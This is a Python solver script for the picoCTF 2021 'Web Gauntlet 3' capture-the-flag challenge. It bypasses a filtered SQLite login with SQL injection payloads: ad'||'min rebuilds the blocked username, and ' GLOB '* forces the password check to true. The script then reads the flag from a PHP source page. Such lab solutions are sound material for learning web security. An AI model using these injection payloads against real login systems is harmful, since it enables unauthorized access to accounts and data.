"""Solver for challenge 128 Web Gauntlet 3 (picoCTF 2021, Web).

Filtered SQLite login (blocks: or and true false union like = > < ; -- /* */
admin, 25-char combined limit). Bypass: username ad'||'min rebuilds 'admin'
via || concatenation; password ' GLOB '* turns the password check into
'' GLOB '*' which is TRUE (GLOB is not filtered). Winner session then reads
the flag from the filter.php source comment.

Usage: solve_128_web_gauntlet_3.py <base_url>
"""
import re
import sys
import urllib.parse
import urllib.request


def solve(base: str) -> str:
    base = base.rstrip('/')
    jar: dict = {}

    def req(path: str, data: dict | None = None) -> str:
        r = urllib.request.Request(
            base + path,
            data=urllib.parse.urlencode(data).encode() if data else None,
            headers={'Cookie': '; '.join(f'{k}={v}' for k, v in jar.items())})
        with urllib.request.urlopen(r, timeout=20) as resp:
            for h, v in resp.getheaders():
                if h.lower() == 'set-cookie':
                    kv = v.split(';')[0]
                    if '=' in kv:
                        k, vv = kv.split('=', 1)
                        jar[k.strip()] = vv.strip()
            return resp.read().decode(errors='replace')

    body = req('/index.php', {'user': "ad'||'min", 'pass': "' GLOB '*"})
    assert 'You won' in body, 'login bypass failed'
    page = req('/filter.php')
    m = re.search(r'academy\{[^}]+\}', page)
    assert m, 'flag not found'
    return m.group(0)


if __name__ == '__main__':
    print(solve(sys.argv[1] if len(sys.argv) > 1 else 'http://xebec.cylabacademy.net:36996'))
